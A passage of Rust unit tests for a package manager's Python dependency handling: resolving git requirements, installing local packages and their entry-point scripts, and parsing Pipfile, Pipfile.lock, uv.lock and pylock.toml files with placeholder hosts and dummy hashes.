            .arg("-C")
            .arg(&repo)
            .arg("-c")
            .arg("user.email=omc@example.invalid")
            .arg("-c")
            .arg("user.name=omc test")
            .arg("commit")
            .arg("--quiet")
            .arg("-m")
            .arg("second")
            .status()
            .unwrap()
            .success());
        assert_ne!(git_rev_parse_head(&repo, "gitpkg").unwrap(), first_commit);
        remove_path_if_exists(&repo).unwrap();
        remove_path_if_exists(&project.join(".omc/python/vcs")).unwrap();

        install_locked_project(&LinkOptions::new(&project)).unwrap();
        let output = Command::new(project.join(".omc/python/bin/git-vcs-cli"))
            .output()
            .unwrap();
        assert!(output.status.success());
        assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "v1");
    }

    #[test]
    fn locked_python_vcs_install_requires_lock_entry() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("requirements.txt"),
            "gitpkg @ git+https://example.invalid/gitpkg.git@main\n",
        )
        .unwrap();
        fs::write(
            dir.path().join("omc.lock"),
            toml::to_string_pretty(&OmcLock::new()).unwrap(),
        )
        .unwrap();

        let error = install_locked_project(&LinkOptions::new(dir.path())).unwrap_err();
        assert!(matches!(error, OmcRegistryError::LockfileOutOfDate(_)));
    }

    #[test]
    fn reads_python_vcs_static_dependencies() {
        let dir = tempfile::tempdir().unwrap();
        let repo = dir.path().join("gitpkg-repo");
        fs::create_dir_all(repo.join("gitpkg")).unwrap();
        fs::write(repo.join("gitpkg").join("__init__.py"), "").unwrap();
        fs::write(
            repo.join("pyproject.toml"),
            r#"
            [project]
            name = "gitpkg"
            dependencies = ["idna==3.7"]
            "#,
        )
        .unwrap();
        commit_git_repo(&repo);

        let repo_url = reqwest::Url::from_directory_path(&repo)
            .unwrap()
            .to_string();
        let vcs = PythonVcsRequirement {
            name: "gitpkg".to_owned(),
            url: repo_url,
            reference: Some("HEAD".to_owned()),
            subdirectory: None,
            extras: BTreeSet::new(),
        };
        let resolved = resolve_python_vcs_requirements(dir.path(), &[vcs], None).unwrap();
        assert!(has_spec(&resolved.requirements.specs, "idna", "==3.7"));
        assert_eq!(resolved.requirements.python_local_paths.len(), 1);
        assert_eq!(resolved.locks.len(), 1);
        assert!(is_git_commit_hash(&resolved.locks[0].resolved_commit));
    }

    #[test]
    fn installs_editable_python_local_paths_preferring_src_layout() {
        let dir = tempfile::tempdir().unwrap();
        let local = dir.path().join("localpkg");
        let src = local.join("src");
        fs::create_dir_all(src.join("localpkg")).unwrap();
        let site_packages = dir.path().join(".omc").join("python").join("site-packages");
        let bin_dir = dir.path().join(".omc").join("python").join("bin");
        fs::create_dir_all(&site_packages).unwrap();
        fs::write(src.join("localpkg").join("__init__.py"), "").unwrap();
        fs::write(
            src.join("localpkg").join("cli.py"),
            "def main():\n    print('local-cli-ok')\n",
        )
        .unwrap();
        fs::write(
            local.join("pyproject.toml"),
            r#"
            [project]
            name = "localpkg"

            [project.scripts]
            local-cli = "localpkg.cli:main"

            [project.gui-scripts]
            local-gui = "localpkg.gui:main"
            "#,
        )
        .unwrap();

        let scripts =
            install_python_local_paths(std::slice::from_ref(&local), &site_packages, &bin_dir)
                .unwrap();
        assert_eq!(scripts, 2);

        let expected = fs::canonicalize(src).unwrap();
        let content =
            fs::read_to_string(dir.path().join(".omc").join("python").join("local-paths")).unwrap();
        assert_eq!(content.trim(), expected.to_string_lossy());
        let script = fs::read_to_string(bin_dir.join("local-cli")).unwrap();
        assert!(script.contains("from localpkg.cli import main"));
        let script = fs::read_to_string(bin_dir.join("local-gui")).unwrap();
        assert!(script.contains("from localpkg.gui import main"));

        let output = Command::new(bin_dir.join("local-cli")).output().unwrap();
        assert!(output.status.success());
        assert_eq!(
            String::from_utf8_lossy(&output.stdout).trim(),
            "local-cli-ok"
        );
    }

    #[test]
    fn installs_setup_cfg_python_local_entry_points() {
        let dir = tempfile::tempdir().unwrap();
        let local = dir.path().join("setuppkg");
        let src = local.join("src");
        fs::create_dir_all(src.join("setuppkg")).unwrap();
        let site_packages = dir.path().join(".omc").join("python").join("site-packages");
        let bin_dir = dir.path().join(".omc").join("python").join("bin");
        fs::create_dir_all(&site_packages).unwrap();
        fs::write(src.join("setuppkg").join("__init__.py"), "").unwrap();
        fs::write(
            src.join("setuppkg").join("cli.py"),
            "def main():\n    print('setup-cfg-cli-ok')\n",
        )
        .unwrap();
        fs::write(
            local.join("setup.cfg"),
            r#"
            [metadata]
            name = setuppkg

            [options.entry_points]
            console_scripts =
                setup-cli = setuppkg.cli:main
            gui_scripts =
                setup-gui = setuppkg.gui:main
            "#,
        )
        .unwrap();

        let scripts =
            install_python_local_paths(std::slice::from_ref(&local), &site_packages, &bin_dir)
                .unwrap();
        assert_eq!(scripts, 2);

        let script = fs::read_to_string(bin_dir.join("setup-cli")).unwrap();
        assert!(script.contains("from setuppkg.cli import main"));
        let script = fs::read_to_string(bin_dir.join("setup-gui")).unwrap();
        assert!(script.contains("from setuppkg.gui import main"));

        let output = Command::new(bin_dir.join("setup-cli")).output().unwrap();
        assert!(output.status.success());
        assert_eq!(
            String::from_utf8_lossy(&output.stdout).trim(),
            "setup-cfg-cli-ok"
        );
    }

    #[test]
    fn installs_setup_py_python_local_entry_points() {
        let dir = tempfile::tempdir().unwrap();
        let local = dir.path().join("setuppkg");
        let src = local.join("src");
        fs::create_dir_all(src.join("setuppkg")).unwrap();
        let site_packages = dir.path().join(".omc").join("python").join("site-packages");
        let bin_dir = dir.path().join(".omc").join("python").join("bin");
        fs::create_dir_all(&site_packages).unwrap();
        fs::write(src.join("setuppkg").join("__init__.py"), "").unwrap();
        fs::write(
            src.join("setuppkg").join("cli.py"),
            "def main():\n    print('setup-py-cli-ok')\n",
        )
        .unwrap();
        fs::write(
            local.join("setup.py"),
            r#"
            from setuptools import setup

            NOTE = "entry_points={'console_scripts': ['ignored-string = ignored:main']}"
            # entry_points={"console_scripts": ["ignored-comment = ignored:main"]}

            setup(
                name="setuppkg",
                entry_points={
                    "console_scripts": [
                        "setup-cli = setuppkg.cli:main",
                    ],
                    "gui_scripts": ["setup-gui = setuppkg.gui:main"],
                    "pytest11": ["ignored = ignored:plugin"],
                },
            )
            "#,
        )
        .unwrap();

        let scripts =
            install_python_local_paths(std::slice::from_ref(&local), &site_packages, &bin_dir)
                .unwrap();
        assert_eq!(scripts, 2);

        let script = fs::read_to_string(bin_dir.join("setup-cli")).unwrap();
        assert!(script.contains("from setuppkg.cli import main"));
        let script = fs::read_to_string(bin_dir.join("setup-gui")).unwrap();
        assert!(script.contains("from setuppkg.gui import main"));
        assert!(!bin_dir.join("ignored").exists());
        assert!(!bin_dir.join("ignored-string").exists());
        assert!(!bin_dir.join("ignored-comment").exists());

        let output = Command::new(bin_dir.join("setup-cli")).output().unwrap();
        assert!(output.status.success());
        assert_eq!(
            String::from_utf8_lossy(&output.stdout).trim(),
            "setup-py-cli-ok"
        );
    }

    #[test]
    fn installs_root_python_project_as_local_path() {
        let dir = tempfile::tempdir().unwrap();
        let src = dir.path().join("src");
        fs::create_dir_all(src.join("rootpkg")).unwrap();
        fs::write(
            src.join("rootpkg").join("__init__.py"),
            "VALUE = 'root-ok'\n",
        )
        .unwrap();
        fs::write(
            src.join("rootpkg").join("cli.py"),
            "from rootpkg import VALUE\n\ndef main():\n    print(VALUE)\n",
        )
        .unwrap();
        fs::write(
            dir.path().join("pyproject.toml"),
            r#"
            [project]
            name = "rootpkg"
            version = "0.1.0"

            [project.scripts]
            root-cli = "rootpkg.cli:main"
            "#,
        )
        .unwrap();

        let report = install_project(&LinkOptions::new(dir.path())).unwrap();
        assert_eq!(report.python_scripts, 1);

        let expected = fs::canonicalize(src).unwrap();
        let content =
            fs::read_to_string(dir.path().join(".omc").join("python").join("local-paths")).unwrap();
        assert_eq!(content.trim(), expected.to_string_lossy());

        let output = Command::new(
            dir.path()
                .join(".omc")
                .join("python")
                .join("bin")
                .join("root-cli"),
        )
        .output()
        .unwrap();
        assert!(output.status.success());
        assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "root-ok");
    }

    #[test]
    fn locked_install_restores_root_python_project_scripts() {
        let dir = tempfile::tempdir().unwrap();
        let src = dir.path().join("src");
        fs::create_dir_all(src.join("rootpkg")).unwrap();
        fs::write(
            src.join("rootpkg").join("__init__.py"),
            "VALUE = 'locked-root-ok'\n",
        )
        .unwrap();
        fs::write(
            src.join("rootpkg").join("cli.py"),
            "from rootpkg import VALUE\n\ndef main():\n    print(VALUE)\n",
        )
        .unwrap();
        fs::write(
            dir.path().join("pyproject.toml"),
            r#"
            [project]
            name = "rootpkg"
            version = "0.1.0"

            [project.scripts]
            root-cli = "rootpkg.cli:main"
            "#,
        )
        .unwrap();
        fs::write(
            dir.path().join("omc.lock"),
            toml::to_string_pretty(&OmcLock::new()).unwrap(),
        )
        .unwrap();

        let report = install_locked_packages(dir.path()).unwrap();
        assert_eq!(report.python_scripts, 1);

        let expected = fs::canonicalize(src).unwrap();
        let content =
            fs::read_to_string(dir.path().join(".omc").join("python").join("local-paths")).unwrap();
        assert_eq!(content.trim(), expected.to_string_lossy());

        let output = Command::new(
            dir.path()
                .join(".omc")
                .join("python")
                .join("bin")
                .join("root-cli"),
        )
        .output()
        .unwrap();
        assert!(output.status.success());
        assert_eq!(
            String::from_utf8_lossy(&output.stdout).trim(),
            "locked-root-ok"
        );
    }

    #[test]
    fn discovers_root_setup_metadata_as_local_path() {
        let setup_cfg_dir = tempfile::tempdir().unwrap();
        fs::write(
            setup_cfg_dir.path().join("setup.cfg"),
            r#"
            [metadata]
            name = setup-cfg-root
            "#,
        )
        .unwrap();
        let discovered = discover_project_requirements(setup_cfg_dir.path()).unwrap();
        assert_eq!(
            discovered.python_local_paths,
            vec![setup_cfg_dir.path().to_path_buf()]
        );

        let setup_py_dir = tempfile::tempdir().unwrap();
        fs::write(
            setup_py_dir.path().join("setup.py"),
            r#"from setuptools import setup
setup(name="setup-py-root")
"#,
        )
        .unwrap();
        let discovered = discover_project_requirements(setup_py_dir.path()).unwrap();
        assert_eq!(
            discovered.python_local_paths,
            vec![setup_py_dir.path().to_path_buf()]
        );
    }

    #[test]
    fn parses_setup_py_entry_points_ini_string() {
        let entries = parse_setup_py_entry_points(
            r#"
            from setuptools import setup

            setup(
                entry_points="""
                [console_scripts]
                setup-cli = setuppkg.cli:main

                [gui_scripts]
                setup-gui = setuppkg.gui:main
                """,
            )
            "#,
        );

        assert_eq!(
            entries,
            vec![
                PythonEntryPoint {
                    name: "setup-cli".to_owned(),
                    module: "setuppkg.cli".to_owned(),
                    function: "main".to_owned(),
                },
                PythonEntryPoint {
                    name: "setup-gui".to_owned(),
                    module: "setuppkg.gui".to_owned(),
                    function: "main".to_owned(),
                }
            ]
        );
    }

    #[test]
    fn installs_poetry_table_python_local_entry_points() {
        let dir = tempfile::tempdir().unwrap();
        let local = dir.path().join("poetrypkg");
        let src = local.join("src");
        fs::create_dir_all(src.join("poetrypkg")).unwrap();
        let site_packages = dir.path().join(".omc").join("python").join("site-packages");
        let bin_dir = dir.path().join(".omc").join("python").join("bin");
        fs::create_dir_all(&site_packages).unwrap();
        fs::write(src.join("poetrypkg").join("__init__.py"), "").unwrap();
        fs::write(
            src.join("poetrypkg").join("cli.py"),
            "def main():\n    print('poetry-table-cli-ok')\n",
        )
        .unwrap();
        fs::write(
            local.join("pyproject.toml"),
            r#"
            [tool.poetry]
            name = "poetrypkg"
            version = "0.1.0"

            [tool.poetry.scripts]
            poetry-cli = { callable = "poetrypkg.cli:main" }
            ignored-file = { reference = "scripts/run.py", type = "file" }
            "#,
        )
        .unwrap();

        let scripts =
            install_python_local_paths(std::slice::from_ref(&local), &site_packages, &bin_dir)
                .unwrap();
        assert_eq!(scripts, 1);

        let script = fs::read_to_string(bin_dir.join("poetry-cli")).unwrap();
        assert!(script.contains("from poetrypkg.cli import main"));
        assert!(!bin_dir.join("ignored-file").exists());

        let output = Command::new(bin_dir.join("poetry-cli")).output().unwrap();
        assert!(output.status.success());
        assert_eq!(
            String::from_utf8_lossy(&output.stdout).trim(),
            "poetry-table-cli-ok"
        );
    }

    #[test]
    fn reads_pipfile_specs_sources_paths_and_dev_packages() {
        let dir = tempfile::tempdir().unwrap();
        let pipfile = dir.path().join("Pipfile");
        let local_pkg = dir.path().join("localpkg");
        let dev_local = dir.path().join("devlocal");
        let wheel = dir
            .path()
            .join("wheels")
            .join("local_idna-3.7-py3-none-any.whl");
        let sdist = dir.path().join("wheels").join("local_source-1.0.0.tar.gz");
        fs::create_dir_all(&local_pkg).unwrap();
        fs::create_dir_all(&dev_local).unwrap();
        fs::create_dir_all(wheel.parent().unwrap()).unwrap();
        fs::write(&wheel, b"not a real wheel").unwrap();
        fs::write(&sdist, b"not a real sdist").unwrap();
        fs::write(
            &pipfile,
            r#"
            [[source]]
            name = "pypi"
            url = "https://pypi.org/simple"
            verify_ssl = true

            [[source]]
            name = "private"
            url = "https://packages.example/simple"
            verify_ssl = true

            [[source]]
            name = "duplicate"
            url = "https://packages.example/simple/"
            verify_ssl = true

            [packages]
            requests = { version = "==2.32.3", extras = ["socks"], markers = "python_version >= '3'", index = "private" }
            old-python-only = { version = "==0.1.0", markers = "python_version < '2'" }
            localpkg = { path = "localpkg", editable = true }
            local-idna = { file = "wheels/local_idna-3.7-py3-none-any.whl" }
            local-source = { file = "wheels/local_source-1.0.0.tar.gz" }
            any-version = "*"

            [dev-packages]
            pytest = "==8.2.0"
            devlocal = { path = "devlocal" }
            "#,
        )
        .unwrap();

        let production = read_pipfile_requirements(&pipfile, false).unwrap();
        let requests = production
            .specs
            .iter()
            .find(|spec| spec.name == "requests")
            .unwrap();
        assert_eq!(requests.version.as_deref(), Some("==2.32.3"));
        assert!(requests.extras.contains("socks"));
        let any_version = production
            .specs
            .iter()
            .find(|spec| spec.name == "any-version")
            .unwrap();
        assert_eq!(any_version.version.as_deref(), None);
        let local = production
            .specs
            .iter()
            .find(|spec| spec.name == "local-idna")
            .unwrap();
        assert!(local.direct_url.as_deref().unwrap().starts_with("file://"));
        assert!(local
            .direct_url
            .as_deref()
            .unwrap()
            .ends_with("local_idna-3.7-py3-none-any.whl"));
        let local_source = production
            .specs
            .iter()
            .find(|spec| spec.name == "local-source")
            .unwrap();
        assert!(local_source
            .direct_url
            .as_deref()
            .unwrap()
            .ends_with("local_source-1.0.0.tar.gz"));
        assert_eq!(
            production.pypi_index_url.as_deref(),
            Some("https://pypi.org/simple/")
        );
        assert_eq!(
            production.pypi_extra_index_urls,
            vec!["https://packages.example/simple/".to_owned()]
        );
        assert_eq!(production.python_local_paths, vec![local_pkg.clone()]);
        assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));
        assert!(!production
            .specs
            .iter()
            .any(|spec| spec.name == "old-python-only"));

        let dev = read_pipfile_requirements(&pipfile, true).unwrap();
        assert!(dev
            .specs
            .iter()
            .any(|spec| spec.name == "pytest" && spec.version.as_deref() == Some("==8.2.0")));
        assert_eq!(dev.python_local_paths, vec![local_pkg, dev_local]);
    }

    #[test]
    fn discovers_pipfile_requirements_without_lock() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("localpkg")).unwrap();
        fs::write(
            dir.path().join("Pipfile"),
            r#"
            [[source]]
            name = "pypi"
            url = "https://pypi.org/simple"
            verify_ssl = true

            [packages]
            idna = "==3.7"
            localpkg = { path = "localpkg" }

            [dev-packages]
            pytest = "==8.2.0"
            "#,
        )
        .unwrap();

        let production =
            discover_project_requirements_with_options(dir.path(), &BTreeSet::new(), false)
                .unwrap();
        assert!(production
            .specs
            .iter()
            .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some("==3.7")));
        assert_eq!(
            production.python_local_paths,
            vec![dir.path().join("localpkg")]
        );
        assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));

        let dev = discover_project_requirements(dir.path()).unwrap();
        assert!(dev
            .specs
            .iter()
            .any(|spec| spec.name == "pytest" && spec.version.as_deref() == Some("==8.2.0")));
    }

    #[test]
    fn pipfile_lock_takes_precedence_over_pipfile() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("Pipfile"),
            r#"
            [packages]
            flask = "==3.0.0"
            "#,
        )
        .unwrap();
        fs::write(
            dir.path().join("Pipfile.lock"),
            r#"{
                "_meta": {},
                "default": {
                    "idna": { "version": "==3.7" }
                }
            }"#,
        )
        .unwrap();

        let discovered = discover_project_requirements(dir.path()).unwrap();
        assert!(discovered
            .specs
            .iter()
            .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some("3.7")));
        assert!(!discovered.specs.iter().any(|spec| spec.name == "flask"));
    }

    #[test]
    fn reads_pipfile_vcs_dependencies_and_rejects_missing_paths() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("Pipfile"),
            r#"
            [packages]
            git-package = { git = "https://example.invalid/pkg.git", ref = "abc123", extras = ["cli"], subdirectory = "pkg" }
            "#,
        )
        .unwrap();
        let discovered = discover_project_requirements(dir.path()).unwrap();
        assert_eq!(discovered.python_vcs_requirements.len(), 1);
        let vcs = &discovered.python_vcs_requirements[0];
        assert_eq!(vcs.name, "git-package");
        assert_eq!(vcs.url, "https://example.invalid/pkg.git");
        assert_eq!(vcs.reference.as_deref(), Some("abc123"));
        assert_eq!(vcs.subdirectory.as_deref(), Some(Path::new("pkg")));
        assert_eq!(vcs.extras, BTreeSet::from(["cli".to_owned()]));

        fs::write(
            dir.path().join("Pipfile"),
            r#"
            [packages]
            local-package = { path = "missing" }
            "#,
        )
        .unwrap();
        let error = discover_project_requirements(dir.path()).unwrap_err();
        assert!(error.to_string().contains("Pipfile local path"));
    }

    #[test]
    fn reads_pipfile_lock_specs_constraints_and_hashes() {
        let dir = tempfile::tempdir().unwrap();
        let pipfile_lock = dir.path().join("Pipfile.lock");
        let editable_local = dir.path().join("editable-local");
        let dev_local = dir.path().join("dev-local");
        fs::create_dir_all(&editable_local).unwrap();
        fs::create_dir_all(&dev_local).unwrap();
        let hash = "a".repeat(64);
        fs::write(
            &pipfile_lock,
            format!(
                r#"{{
                    "_meta": {{
                        "sources": [
                            {{
                                "name": "pypi",
                                "url": "https://pypi.org/simple",
                                "verify_ssl": true
                            }},
                            {{
                                "name": "private",
                                "url": "https://packages.example/simple",
                                "verify_ssl": true
                            }},
                            {{
                                "name": "duplicate",
                                "url": "https://packages.example/simple/",
                                "verify_ssl": true
                            }}
                        ]
                    }},
                    "default": {{
                        "Requests": {{
                            "version": "==2.32.3",
                            "hashes": ["sha256:{hash}"],
                            "extras": ["socks"],
                            "markers": "python_version >= '3'"
                        }},
                        "old-python-only": {{
                            "version": "==0.1.0",
                            "markers": "python_version < '2'"
                        }},
                        "editable-local": {{
                            "path": "."
                        }},
                        "local-dir": {{
                            "path": "editable-local"
                        }},
                        "git-locked": {{
                            "git": "https://example.invalid/git-locked.git",
                            "ref": "def456",
                            "extras": ["cli"],
                            "subdirectory": "pkg"
                        }}
                    }},
                    "develop": {{
                        "pytest": {{
                            "version": "==8.2.0"
                        }},
                        "dev-local": {{
                            "path": "dev-local"
                        }}
                    }}
                }}"#
            ),
        )
        .unwrap();

        let production = read_pipfile_lock_requirements(&pipfile_lock, false).unwrap();
        let requests = production
            .specs
            .iter()
            .find(|spec| spec.name == "requests")
            .unwrap();
        assert_eq!(requests.version.as_deref(), Some("2.32.3"));
        assert!(requests.extras.contains("socks"));
        assert_eq!(
            production
                .constraints
                .get("pypi:requests")
                .map(String::as_str),
            Some("2.32.3")
        );
        assert_eq!(
            production
                .hashes
                .get("pypi:requests")
                .and_then(|hashes| hashes.iter().next())
                .map(String::as_str),
            Some(hash.as_str())
        );
        assert_eq!(
            production.pypi_index_url.as_deref(),
            Some("https://pypi.org/simple/")
        );
        assert_eq!(
            production.pypi_extra_index_urls,
            vec!["https://packages.example/simple/".to_owned()]
        );
        assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));
        assert!(!production
            .specs
            .iter()
            .any(|spec| spec.name == "old-python-only"));
        assert!(!production
            .specs
            .iter()
            .any(|spec| spec.name == "editable-local"));
        assert_eq!(
            production.python_local_paths,
            vec![dir.path().join("."), editable_local.clone()]
        );
        assert_eq!(production.python_vcs_requirements.len(), 1);
        let vcs = &production.python_vcs_requirements[0];
        assert_eq!(vcs.name, "git-locked");
        assert_eq!(vcs.url, "https://example.invalid/git-locked.git");
        assert_eq!(vcs.reference.as_deref(), Some("def456"));
        assert_eq!(vcs.subdirectory.as_deref(), Some(Path::new("pkg")));
        assert_eq!(vcs.extras, BTreeSet::from(["cli".to_owned()]));

        let dev = read_pipfile_lock_requirements(&pipfile_lock, true).unwrap();
        assert!(dev
            .specs
            .iter()
            .any(|spec| spec.name == "pytest" && spec.version.as_deref() == Some("8.2.0")));
        assert_eq!(
            dev.pypi_index_url.as_deref(),
            Some("https://pypi.org/simple/")
        );
        assert_eq!(
            dev.pypi_extra_index_urls,
            vec!["https://packages.example/simple/".to_owned()]
        );
        assert_eq!(
            dev.python_local_paths,
            vec![dir.path().join("."), editable_local, dev_local]
        );
    }

    #[test]
    fn discovers_pipfile_lock_requirements() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("localpkg")).unwrap();
        fs::write(
            dir.path().join("Pipfile.lock"),
            r#"{
                "_meta": {
                    "sources": [
                        { "name": "pypi", "url": "https://pypi.org/simple", "verify_ssl": true },
                        { "name": "internal", "url": "https://internal.example/simple", "verify_ssl": true }
                    ]
                },
                "default": {
                    "idna": { "version": "==3.7" },
                    "localpkg": { "path": "localpkg" }
                },
                "develop": {
                    "pytest": { "version": "==8.2.0" }
                }
            }"#,
        )
        .unwrap();

        let production =
            discover_project_requirements_with_options(dir.path(), &BTreeSet::new(), false)
                .unwrap();
        assert!(production
            .specs
            .iter()
            .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some("3.7")));
        assert_eq!(
            production.python_local_paths,
            vec![dir.path().join("localpkg")]
        );
        assert_eq!(
            production.pypi_index_url.as_deref(),
            Some("https://pypi.org/simple/")
        );
        assert_eq!(
            production.pypi_extra_index_urls,
            vec!["https://internal.example/simple/".to_owned()]
        );
        assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));

        let dev = discover_project_requirements(dir.path()).unwrap();
        assert!(dev
            .specs
            .iter()
            .any(|spec| spec.name == "pytest" && spec.version.as_deref() == Some("8.2.0")));
    }

    #[test]
    fn rejects_missing_pipfile_lock_local_paths() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("Pipfile.lock"),
            r#"{
                "_meta": {},
                "default": {
                    "local": { "path": "missing" }
                }
            }"#,
        )
        .unwrap();

        let error = discover_project_requirements(dir.path()).unwrap_err();
        assert!(error.to_string().contains("Pipfile.lock local path"));
    }

    #[test]
    fn reads_uv_lock_specs_constraints_and_hashes() {
        let dir = tempfile::tempdir().unwrap();
        let uv_lock = dir.path().join("uv.lock");
        let local_pkg = dir.path().join("vendor/localpkg");
        let dev_local = dir.path().join("vendor/devlocal");
        fs::create_dir_all(&local_pkg).unwrap();
        fs::create_dir_all(&dev_local).unwrap();
        let idna_sdist = "a".repeat(64);
        let idna_wheel = "b".repeat(64);
        let requests_wheel = "c".repeat(64);
        fs::write(
            &uv_lock,
            format!(
                r#"version = 1
revision = 3
requires-python = ">=3.11"

[[package]]
name = "idna"
version = "3.7"
source = {{ registry = "https://pypi.org/simple" }}
sdist = {{ url = "https://files.example/idna-3.7.tar.gz", hash = "sha256:{idna_sdist}" }}
wheels = [
  {{ url = "https://files.example/idna-3.7-py3-none-any.whl", hash = "sha256:{idna_wheel}" }},
]

[[package]]
name = "requests"
version = "2.32.3"
source = {{ registry = "https://pypi.org/simple" }}
wheels = [
  {{ url = "https://files.example/requests-2.32.3-py3-none-any.whl", hash = "sha256:{requests_wheel}" }},
]

[[package]]
name = "localpkg"
version = "0.1.0"
source = {{ editable = "vendor/localpkg" }}

[[package]]
name = "devlocal"
version = "0.1.0"
source = {{ directory = "vendor/devlocal" }}

[[package]]
name = "omc-uv-demo"
version = "0.1.0"
source = {{ virtual = "." }}

[package.metadata]
requires-dist = [
  {{ name = "requests", extras = ["socks"], specifier = "==2.32.3" }},
  {{ name = "localpkg", editable = "vendor/localpkg" }},
  {{ name = "old-python-only", specifier = "==0.1.0", marker = "python_version < '2'" }},
]

[package.metadata.requires-dev]
dev = [
  {{ name = "pytest", specifier = "==8.2.0" }},
  {{ name = "devlocal" }},
]
"#
            ),
        )
        .unwrap();

        let production = read_uv_lock_requirements(&uv_lock, false).unwrap();
        let requests = production
            .specs
            .iter()
            .find(|spec| spec.name == "requests")
            .unwrap();
        assert_eq!(requests.version.as_deref(), Some("==2.32.3"));
        assert!(requests.extras.contains("socks"));
        assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));
        assert!(!production
            .specs
            .iter()
            .any(|spec| spec.name == "old-python-only"));
        assert_eq!(production.python_local_paths, vec![local_pkg.clone()]);
        assert_eq!(
            production.constraints.get("pypi:idna").map(String::as_str),
            Some("3.7")
        );
        assert_eq!(
            production
                .constraints
                .get("pypi:requests")
                .map(String::as_str),
            Some("2.32.3")
        );
        assert_eq!(
            production.hashes.get("pypi:idna").cloned().unwrap(),
            BTreeSet::from([idna_sdist, idna_wheel])
        );
        assert_eq!(
            production
                .hashes
                .get("pypi:requests")
                .and_then(|hashes| hashes.iter().next())
                .map(String::as_str),
            Some(requests_wheel.as_str())
        );

        let dev = read_uv_lock_requirements(&uv_lock, true).unwrap();
        assert!(dev
            .specs
            .iter()
            .any(|spec| spec.name == "pytest" && spec.version.as_deref() == Some("==8.2.0")));
        assert_eq!(dev.python_local_paths, vec![local_pkg, dev_local]);
    }

    #[test]
    fn discovers_uv_lock_requirements() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("vendor/localpkg")).unwrap();
        fs::write(
            dir.path().join("uv.lock"),
            r#"version = 1
revision = 3
requires-python = ">=3.11"

[[package]]
name = "idna"
version = "3.7"
source = { registry = "https://pypi.org/simple" }
wheels = [
  { url = "https://files.example/idna-3.7-py3-none-any.whl", hash = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" },
]

[[package]]
name = "localpkg"
version = "0.1.0"
source = { directory = "vendor/localpkg" }

[[package]]
name = "omc-uv-demo"
version = "0.1.0"
source = { virtual = "." }

[package.metadata]
requires-dist = [
  { name = "idna", specifier = "==3.7" },
  { name = "localpkg" },
]
"#,
        )
        .unwrap();

        let discovered = discover_project_requirements(dir.path()).unwrap();
        assert!(discovered
            .specs
            .iter()
            .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some("==3.7")));
        assert_eq!(
            discovered.constraints.get("pypi:idna").map(String::as_str),
            Some("3.7")
        );
        assert_eq!(
            discovered.python_local_paths,
            vec![dir.path().join("vendor/localpkg")]
        );
        assert_eq!(
            discovered
                .hashes
                .get("pypi:idna")
                .and_then(|hashes| hashes.iter().next())
                .map(String::as_str),
            Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
        );
    }

    #[test]
    fn reads_pylock_specs_constraints_and_hashes() {
        let dir = tempfile::tempdir().unwrap();
        let pylock = dir.path().join("pylock.toml");
        let sdist = "a".repeat(64);
        let wheel = "b".repeat(64);
        fs::write(
            &pylock,
            format!(
                r#"lock-version = "1.0"
created-by = "test"
requires-python = ">=3.11"

[[packages]]
name = "idna"
version = "3.7"
index = "https://pypi.org/simple"
sdist = {{ url = "https://files.example/idna-3.7.tar.gz", hashes = {{ sha256 = "{sdist}" }} }}
wheels = [
  {{ url = "https://files.example/idna-3.7-py3-none-any.whl", hashes = {{ sha256 = "{wheel}" }} }},
]

[[packages]]
name = "colorama"
version = "0.4.6"
marker = "sys_platform == 'win32'"
wheels = [
  {{ url = "https://files.example/colorama-0.4.6-py3-none-any.whl", hashes = {{ sha256 = "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc" }} }},
]
"#
            ),
        )
        .unwrap();

        let requirements = read_pylock_requirements(&pylock).unwrap();
        assert!(has_spec(&requirements.specs, "idna", "3.7"));
        assert!(!requirements
            .specs
            .iter()
            .any(|spec| spec.name == "colorama"));
        assert_eq!(
            requirements
                .constraints
                .get("pypi:idna")
                .map(String::as_str),
            Some("3.7")
        );
        assert_eq!(
            requirements.hashes.get("pypi:idna").cloned().unwrap(),
            BTreeSet::from([sdist, wheel])
        );
    }

    #[test]
    fn discovers_pylock_requirements_preferring_omc_specific_file() {
        let dir = tempfile::tempdir().unwrap();
        fs::write(
            dir.path().join("pylock.toml"),
            r#"lock-version = "1.0"

[[packages]]
name = "wrong"
version = "1.0.0"
"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("pylock.omc.toml"),
            r#"lock-version = "1.0"

[[packages]]
name = "idna"
version = "3.7"
wheels = [
  { url = "https://files.example/idna-3.7-py3-none-any.whl", hashes = { sha256 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" } },
]
"#,
        )
        .unwrap();

        let discovered = discover_project_requirements(dir.path()).unwrap();
        assert!(has_spec(&discovered.specs, "idna", "3.7"));
        assert!(!discovered.specs.iter().any(|spec| spec.name == "wrong"));
        assert_eq!(
            discovered
                .hashes
                .get("pypi:idna")
                .and_then(|hashes| hashes.iter().next())
                .map(String::as_str),
            Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
        );
    }

    #[test]
    fn rejects_unsupported_requirements_entries() {
        let dir = tempfile::tempdir().unwrap();
        let requirements = dir.path().join("requirements.txt");
